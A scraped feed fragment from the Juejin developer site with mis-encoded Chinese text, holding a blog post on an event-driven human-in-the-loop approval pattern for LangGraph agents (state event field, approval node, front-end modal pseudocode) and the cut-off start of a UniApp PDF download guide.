content="å‘Šåˆ«â€œé»‘ç›’â€ç­‰å¾…ï¼šå¦‚ä½•åœ¨ LangGraph ä¸­ä¼˜é›…åœ°å®ç°å‰ç«¯å‹å¥½çš„ Human-in-the-Loopï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-11-27T07:29:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="changflow"/> <meta itemprop="url" content="https://juejin.cn/user/3288013785548907"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«â€œé»‘ç›’â€ç­‰å¾…ï¼šå¦‚ä½•åœ¨ LangGraph ä¸­ä¼˜é›…åœ°å®ç°å‰ç«¯å‹å¥½çš„ Human-in-the-Loopï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3288013785548907/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    changflow
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:29:59.000Z" title="Thu Nov 27 2025 07:29:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>å‰è¨€</strong>ï¼šHuman-in-the-Loop (äººæœºååŒ) æ˜¯ Agent ä» Demo èµ°å‘è½åœ°çš„å…³é”®åŠŸèƒ½ã€‚ä½†å®˜æ–¹æ–‡æ¡£é‡Œçš„ <code>interrupt_before</code> çœŸçš„èƒ½ç›´æ¥ç”¨åœ¨ç”Ÿäº§ç¯å¢ƒå—ï¼Ÿ
æœ¬æ–‡å°†åˆ†äº«ä¸€ç§ <strong>Event-Drivenï¼ˆäº‹ä»¶é©±åŠ¨ï¼‰</strong> çš„ HITL è®¾è®¡æ¨¡å¼ï¼Œè®©ä½ çš„ Agent èƒ½å¤Ÿåƒåç«¯æœåŠ¡ä¸€æ ·ï¼Œä¸å‰ç«¯ UI å®Œç¾é…åˆã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">1. åŸç”Ÿ HITL çš„å›°å¢ƒï¼šStatic vs Dynamic</h2>
<p>âš ï¸ <strong>é¿å‘æŒ‡å—</strong>ï¼šæœ‰äº›è¯»è€…å¯èƒ½ä¼šæœåˆ° <code>langchain.agents.middleware.HumanInTheLoopMiddleware</code> è¿™ä¸ªç±»ã€‚
<strong>ç–‘é—®</strong>ï¼š<em>â€œè¿™ä¸ª Middleware çœ‹èµ·æ¥ç”¨æ³•å¾ˆç®€å•ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜è¦ç”¨æ›´å¤æ‚çš„ LangGraph æ¶æ„ï¼Ÿâ€</em>
<strong>çœŸç›¸</strong>ï¼š</p>
<ol>
<li><strong>æ¶æ„ä»£å·®</strong>ï¼š<code>HumanInTheLoopMiddleware</code> æ˜¯ä¸ºä¸Šä¸€ä»£ <strong>AgentExecutor</strong>ï¼ˆå¾ªç¯é“¾ï¼‰è®¾è®¡çš„ï¼Œä¸é€‚ç”¨äºæœ€æ–°çš„ <strong>LangGraph</strong> æ¶æ„ã€‚å®ƒçš„â€œæš‚åœâ€å¾€å¾€åŸºäºå†…å­˜ä¸­çš„å›è°ƒï¼Œä¸€æ—¦æœåŠ¡é‡å¯ï¼Œç­‰å¾…å®¡æ‰¹çš„ä¸Šä¸‹æ–‡å¯èƒ½å°±ä¸¢å¤±äº†ã€‚</li>
<li><strong>ç”Ÿäº§çº§èƒ½åŠ›</strong>ï¼š<strong>LangGraph</strong> æ˜¯åŸºäº <strong>çŠ¶æ€æœºï¼ˆState Machineï¼‰</strong> çš„ã€‚å®ƒçš„ HITL èƒ½åŠ›ï¼ˆå¦‚ <code>checkpointer</code>ï¼‰é€šè¿‡æ•°æ®åº“æŒä¹…åŒ–äº†æ¯ä¸€æ¬¡çŠ¶æ€å˜æ›´ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ä»Šå¤©æš‚åœ Agentï¼Œä¸‹å‘¨ä¸€å†æ¢å¤å®ƒï¼Œæˆ–è€…åœ¨ä¸­æ–­æœŸé—´ä¿®æ”¹å®ƒçš„è®°å¿†ï¼ˆTime Travelï¼‰ã€‚è¿™æ˜¯ Middleware å¾ˆéš¾åšåˆ°çš„ã€‚</li>
</ol>
<p>å› æ­¤ï¼Œè™½ç„¶ LangGraph å†™èµ·æ¥ä»£ç å¤šä¸€ç‚¹ï¼Œä½†å®ƒå¸¦æ¥çš„<strong>é²æ£’æ€§</strong>æ˜¯ç”Ÿäº§ç¯å¢ƒå¿…é¡»çš„ã€‚</p>
<p>å¯¹äº LangGraphï¼Œå¸¸ç”¨çš„åšæ³•æ˜¯ <code>interrupt_before</code>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Static Interrupt (é™æ€ä¸­æ–­)</span>
app = workflow.<span class="hljs-built_in">compile</span>(
    checkpointer=memory,
    interrupt_before=[<span class="hljs-string">"action_node"</span>]
)
</code></pre>
<p>ä½†è¿™åœ¨å®é™…è½åœ°æ—¶ä¼šé‡åˆ°â€œä¸Šä¸‹æ–‡ä¸¢å¤±â€çš„é—®é¢˜ï¼š<strong>å‰ç«¯å¦‚ä½•çŸ¥é“ä¸ºä»€ä¹ˆè¦ä¸­æ–­ï¼Ÿä¸­æ–­æ—¶æºå¸¦çš„æ•°æ®ï¼ˆPayloadï¼‰åœ¨å“ªé‡Œï¼Ÿ</strong>
å•çº¯çš„ <code>interrupt_before</code> åªæ˜¯è®©å›¾åœä¸‹æ¥ï¼Œå¹¶æ²¡æœ‰å‘Šè¯‰å¤–éƒ¨ä¸–ç•Œâ€œå‘ç”Ÿäº†ä»€ä¹ˆâ€ã€‚è™½ç„¶ LangGraph åæ¥æ¨å‡ºäº† <code>interrupt()</code> å‡½æ•°ï¼ˆDynamic Interruptï¼‰æ¥å°è¯•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†åœ¨å¤æ‚çš„ä¼ä¸šçº§ä¸šåŠ¡ä¸­ï¼Œæˆ‘ä»¬ä¾ç„¶é¢ä¸´æŒ‘æˆ˜ï¼š</p>
<ul>
<li><strong>æ•°æ®æŒä¹…åŒ–</strong>ï¼š<code>interrupt()</code> çš„ payload æ˜¯è¿è¡Œæ—¶çŠ¶æ€ã€‚å¦‚æœæˆ‘ä¸å°å¿ƒé‡å¯äº†æœåŠ¡å™¨ï¼Œæˆ–è€…æˆ‘æƒ³ä»…ä»…é€šè¿‡æŸ¥è¯¢æ•°æ®åº“ï¼ˆè€Œä¸è¿è¡Œ Graphï¼‰æ¥è·å–â€œå½“å‰æœ‰å“ªäº›å¾…å®¡æ‰¹ä»»åŠ¡â€ï¼Œè¿è¡Œæ—¶ä¸­æ–­ä¿¡æ¯å°±å¾ˆéš¾è·å–äº†ã€‚</li>
<li><strong>é¢†åŸŸæ¨¡å‹è€¦åˆ</strong>ï¼šå®¡æ‰¹æµå¾€å¾€æ˜¯ä¸šåŠ¡é€»è¾‘çš„ä¸€éƒ¨åˆ†ï¼Œåº”è¯¥å­˜å‚¨åœ¨ <code>AgentState</code>ï¼ˆé¢†åŸŸæ¨¡å‹ï¼‰ä¸­ï¼Œè€Œä¸æ˜¯éšè—åœ¨ Graph çš„è¿è¡Œæ—¶çš„å †æ ˆé‡Œã€‚</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§ <strong>åŸºäº State çš„äº‹ä»¶é©±åŠ¨æ¨¡å¼</strong>ã€‚</p>
<h2 data-id="heading-1">2. ç ´å±€ï¼šäº‹ä»¶é©±åŠ¨æ¨¡å¼ (Event-Driven HITL)</h2>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchangflow%2Fdeep-research-agent" target="_blank" title="https://github.com/changflow/deep-research-agent" ref="nofollow noopener noreferrer">Deep Research Agent</a> é¡¹ç›®ä¸­ï¼Œè®¾è®¡äº†ä¸€å¥— <strong>åŸºäºäº‹ä»¶</strong> çš„ HITL æœºåˆ¶ã€‚</p>
<h3 data-id="heading-2">2.1 åœ¨ State ä¸­æ˜¾å¼å®šä¹‰â€œæš‚åœäº‹ä»¶â€</h3>
<p>æˆ‘ä»¬ä¸è®© Graph è«åå…¶å¦™åœ°åœï¼Œè€Œæ˜¯å…ˆå¾€ State é‡Œå†™ä¸€å¼ â€œè¯·å‡æ¡â€ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># src/deep_research_agent/core/state.py</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HITLEvent</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    event_type: <span class="hljs-built_in">str</span>        <span class="hljs-comment"># äº‹ä»¶ç±»å‹ï¼Œå¦‚ "approve_plan"</span>
    payload: <span class="hljs-type">Dict</span>          <span class="hljs-comment"># æºå¸¦çš„æ•°æ®ï¼Œå¦‚ç”Ÿæˆçš„ Plan å†…å®¹</span>
    requires_response: <span class="hljs-built_in">bool</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    <span class="hljs-comment"># ...å…¶ä»–å­—æ®µ</span>
    pending_hitl_event: <span class="hljs-type">Optional</span>[HITLEvent]  <span class="hljs-comment"># ğŸ‘ˆ å…³é”®å­—æ®µï¼šå½“å‰çš„æŒ‚èµ·äº‹ä»¶</span>
</code></pre>
<h3 data-id="heading-3">2.2 ä½¿ç”¨â€œå®¡æ‰¹èŠ‚ç‚¹â€ä»£æ›¿ç›´æ¥ä¸­æ–­</h3>
<p>æˆ‘ä»¬ä¸ç›´æ¥åœ¨ <code>search_node</code> å‰ä¸­æ–­ï¼Œè€Œæ˜¯æ’å…¥ä¸€ä¸ªä¸“é—¨çš„ <code>create_approval</code> èŠ‚ç‚¹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># src/deep_research_agent/graph.py</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_plan_approval_node</span>(<span class="hljs-params">state: AgentState</span>):
    <span class="hljs-comment"># 1. åˆ›å»ºäº‹ä»¶</span>
    event = {
        <span class="hljs-string">"event_type"</span>: <span class="hljs-string">"plan_approval"</span>,
        <span class="hljs-string">"payload"</span>: {<span class="hljs-string">"plan"</span>: state[<span class="hljs-string">"plan"</span>]},
        <span class="hljs-string">"requires_response"</span>: <span class="hljs-literal">True</span>
    }
    
    <span class="hljs-comment"># 2. æ›´æ–°çŠ¶æ€ï¼Œå‰ç«¯æ­¤æ—¶èƒ½çœ‹åˆ°è¿™ä¸ª event</span>
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"pending_hitl_event"</span>: event}

<span class="hljs-comment"># åœ¨å›¾é‡Œè¿æ¥ï¼š plan -&gt; create_approval -&gt; wait_node</span>
workflow.add_node(<span class="hljs-string">"create_plan_approval"</span>, create_plan_approval_node)
workflow.add_edge(<span class="hljs-string">"plan_node"</span>, <span class="hljs-string">"create_plan_approval"</span>)
</code></pre>
<h3 data-id="heading-4">2.3 å‰ç«¯çš„å®Œç¾é…åˆ</h3>
<p>ç°åœ¨ï¼Œå‰ç«¯ï¼ˆReact/Vueï¼‰çš„é€»è¾‘å˜å¾—æå…¶æ¸…æ™°ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯ä¼ªä»£ç </span>
<span class="hljs-keyword">const</span> { state } = <span class="hljs-title function_">useAgentStream</span>();

<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> event = state.<span class="hljs-property">pending_hitl_event</span>;
  
  <span class="hljs-keyword">if</span> (event &amp;&amp; event.<span class="hljs-property">requires_response</span>) {
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">event_type</span> === <span class="hljs-string">'plan_approval'</span>) {
      <span class="hljs-comment">// ğŸ’¡ è‡ªåŠ¨å¼¹å‡ºâ€œè®¡åˆ’ç¡®è®¤â€æ¨¡æ€æ¡†</span>
      <span class="hljs-title function_">showModal</span>(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">PlanApprovalModal</span> <span class="hljs-attr">plan</span>=<span class="hljs-string">{event.payload.plan}</span> /&gt;</span></span>);
    }
  }
}, [state]);
</code></pre>
<p>çœ‹ï¼<strong>åç«¯çš„çŠ¶æ€é©±åŠ¨äº†å‰ç«¯çš„ UIã€‚</strong> è¿™æ‰æ˜¯ç°ä»£ Web åº”ç”¨è¯¥æœ‰çš„æ ·å­ã€‚</p>
<h2 data-id="heading-5">3. ä¸ºä»€ä¹ˆè¿™å¾ˆé‡è¦ï¼Ÿ</h2>
<ol>
<li><strong>è§£è€¦</strong>ï¼šGraph åªéœ€è¦è´Ÿè´£äº§ç”Ÿäº‹ä»¶ï¼Œä¸éœ€è¦å…³å¿ƒå‰ç«¯æ€ä¹ˆç”» UIã€‚</li>
<li><strong>å¯è§‚æµ‹æ€§</strong>ï¼šåœ¨æ•°æ®åº“æˆ–æ—¥å¿—é‡Œï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ° Agent åœ¨å“ªä¸€åˆ»ç”Ÿæˆäº†å®¡æ‰¹è¯·æ±‚ï¼Œä»¥åŠç”¨æˆ·ä½•æ—¶ç»™å‡ºäº†åé¦ˆã€‚</li>
<li><strong>çµæ´»æ€§</strong>ï¼šä½ å¯ä»¥åœ¨ <code>payload</code> é‡Œå¡å…¥ä»»ä½•ä¸œè¥¿ï¼Œæ¯”å¦‚æ¨èçš„æœç´¢å…³é”®è¯ã€é£é™©æç¤ºã€ç½®ä¿¡åº¦åˆ†æ•°ç­‰ï¼Œè¾…åŠ©äººç±»åšå†³ç­–ã€‚</li>
</ol>
<h2 data-id="heading-6">4. æºç ä¸å®æˆ˜</h2>
<p>è¿™å¥—æœºåˆ¶çš„å®Œæ•´ Python å®ç°ï¼ˆåŒ…æ‹¬ <code>HITLManager</code> ç±»å’Œ <code>Graph</code> ç¼–æ’ï¼‰éƒ½å·²ç»å¼€æºã€‚
å¦‚æœä½ æ­£åœ¨ä¸ºâ€œAgent æ€ä¹ˆå’Œå‰ç«¯äº¤äº’â€å‘æ„ï¼Œè¿™ç»å¯¹æ˜¯ä½ çš„è§£è¯ã€‚</p>
<p>ğŸ‘‰ <strong>GitHub é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchangflow%2Fdeep-research-agent" target="_blank" title="https://github.com/changflow/deep-research-agent" ref="nofollow noopener noreferrer">github.com/changflow/dâ€¦</a></p>
<hr/>
<p><em>è™½ç„¶è¿™ç§å†™æ³•æ¯”åŸç”Ÿçš„ <code>interrupt</code> å¤šå†™äº†å‡ åè¡Œä»£ç ï¼Œä½†å®ƒæ¢æ¥çš„æ˜¯ä¸€ä¸ªå¥å£®ã€å¯ç»´æŠ¤çš„ç”Ÿäº§çº§ç³»ç»Ÿã€‚å·¥ç¨‹åŒ–çš„é­…åŠ›ï¼Œå¾€å¾€å°±è—åœ¨è¿™äº›â€œå¤šå‡ºæ¥â€çš„ä»£ç é‡Œã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[UniApp PDFæ–‡ä»¶ä¸‹è½½ä¸é¢„è§ˆåŠŸèƒ½å®Œæ•´å®ç°æŒ‡å—]]></title>    <link>https://juejin.cn/post/7577050643202850866</link>    <guid>https://juejin.cn/post/7577050643202850866</guid>    <pubDate>2025-11-27T07:49:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577050643202850866" data-draft-id="7576978338755280946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="UniApp PDFæ–‡ä»¶ä¸‹è½½ä¸é¢„è§ˆåŠŸèƒ½å®Œæ•´å®ç°æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-11-27T07:49:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CyberShen"/> <meta itemprop="url" content="https://juejin.cn/user/554609587530014"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            UniApp PDFæ–‡ä»¶ä¸‹è½½ä¸é¢„è§ˆåŠŸèƒ½å®Œæ•´å®ç°æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/554609587530014/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CyberShen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:49:21.000Z" title="Thu Nov 27 2025 07:49:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŠŸèƒ½æ¦‚è¿°</h2>
<p>åœ¨UniAppå¼€å‘ä¸­ï¼Œå®ç°PDFæ–‡ä»¶çš„ä¸‹è½½ä¸é¢„è§ˆæ˜¯ä¸€é¡¹å¸¸è§éœ€æ±‚ã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»å¦‚ä½•ä½¿ç”¨UniAppæ¡†æ¶å®ç°è¿™ä¸€åŠŸèƒ½ï¼Œå¹¶æä¾›å®Œæ•´çš„ä»£ç ç¤ºä¾‹å’Œæ³¨æ„äº‹é¡¹ã€‚ä»¥ä¸‹æ˜¯å®Œæ•´çš„å®ç°ä»£ç ï¼Œæ”¯æŒå¤šç«¯å…¼å®¹å’Œé”™è¯¯å¤„ç†ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">handleDownload</span> = (item: any) =&gt; {
